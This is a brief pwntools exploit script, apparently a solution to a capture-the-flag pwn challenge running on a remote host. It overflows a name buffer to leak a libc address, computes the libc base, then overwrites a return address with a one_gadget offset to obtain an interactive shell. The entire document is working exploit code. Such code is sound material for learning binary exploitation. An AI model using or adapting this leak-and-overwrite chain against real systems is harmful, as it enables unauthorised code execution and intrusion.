###Lacks check in main func, I'm not familiar with ASAN, so not sure whether this is intendedly designed by challenge author, or ASAN just doesn't preform enough check by default

from pwn import *

###Addr
#  libc2.27
dl_catch_error_ret_offset = 0x16736f
one_gadget = 0x10a38c

###Exploit
r = remote('nc.eonew.cn',10005)

r.sendafter('name: ','a'*0x28)
dl_catch_error_ret_addr = u64(r.recvline()[0x2e:-2]+b'\x00\x00')
libc_base = dl_catch_error_ret_addr-dl_catch_error_ret_offset
print(hex(libc_base))
r.sendlineafter('say?',b'\x00'*0xc8+p64(libc_base+one_gadget))
r.interactive()
